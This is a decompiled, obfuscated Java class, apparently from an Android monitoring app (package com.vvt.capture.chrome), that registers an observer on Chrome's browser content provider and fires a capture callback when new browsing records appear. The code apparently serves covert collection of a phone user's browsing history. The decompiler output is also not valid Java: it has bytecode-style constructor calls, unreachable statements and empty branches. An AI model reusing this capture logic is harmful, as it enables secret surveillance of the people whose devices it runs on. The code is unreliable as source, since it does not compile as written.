package com.vvt.capture.chrome.c;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.base.capture.i;
import com.vvt.d.d;

public class b
  implements com.vvt.base.capture.e
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private i d;
  private c e;
  private ContentResolver f;
  private com.vvt.d.e g;
  private boolean h;
  
  public b(ContentResolver paramContentResolver)
  {
    this.f = paramContentResolver;
  }
  
  private void d()
  {
    boolean bool1 = true;
    float f1 = Float.MIN_VALUE;
    boolean bool2 = false;
    float f2 = 0.0F;
    boolean bool3 = a;
    if (bool3) {}
    Object localObject1 = Uri.parse(a.a);
    Object localObject2 = this.f;
    localObject2 = d.a((Uri)localObject1, (ContentResolver)localObject2);
    if (localObject2 != null)
    {
      localObject1 = ((com.vvt.d.e)localObject2).e();
      if (localObject1 != null) {}
    }
    else
    {
      return;
    }
    if (localObject2 != null)
    {
      localObject1 = this.g;
      if (localObject1 == null) {
        this.g = ((com.vvt.d.e)localObject2);
      }
    }
    for (;;)
    {
      if (bool1)
      {
        bool3 = b;
        if (bool3) {}
        localObject1 = this.d;
        ((i)localObject1).a();
      }
      bool3 = a;
      if (!bool3) {
        break;
      }
      break;
      long l1 = ((com.vvt.d.e)localObject2).a();
      localObject1 = this.g;
      long l2 = ((com.vvt.d.e)localObject1).a();
      bool3 = l1 < l2;
      if (!bool3) {
        bool3 = bool1;
      }
      for (;;)
      {
        l1 = ((com.vvt.d.e)localObject2).b();
        com.vvt.d.e locale = this.g;
        l2 = locale.b();
        l1 -= l2;
        boolean bool4 = a;
        if (bool4) {}
        bool4 = a;
        if ((!bool4) || (bool3))
        {
          l2 = 30000L;
          bool3 = l1 < l2;
          if (!bool3) {}
        }
        else
        {
          bool2 = bool1;
          f2 = f1;
        }
        bool1 = bool2;
        f1 = f2;
        break;
        bool3 = false;
        localObject1 = null;
      }
      bool1 = false;
      f1 = 0.0F;
    }
  }
  
  public void a(i parami)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    this.h = bool1;
    Object localObject = this.e;
    if (localObject == null)
    {
      this.d = parami;
      localObject = new com/vvt/capture/chrome/c/c;
      ((c)localObject).<init>(this);
      this.e = ((c)localObject);
      localObject = Uri.parse("content://com.android.chrome.browser/");
      ContentResolver localContentResolver = this.f;
      c localc = this.e;
      localContentResolver.registerContentObserver((Uri)localObject, bool1, localc);
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.h = false;
    Object localObject = this.f;
    if (localObject != null)
    {
      localObject = this.e;
      if (localObject != null)
      {
        localObject = this.f;
        c localc = this.e;
        ((ContentResolver)localObject).unregisterContentObserver(localc);
      }
    }
    this.g = null;
    this.e = null;
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/MyUncaughtExceptionHandler/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */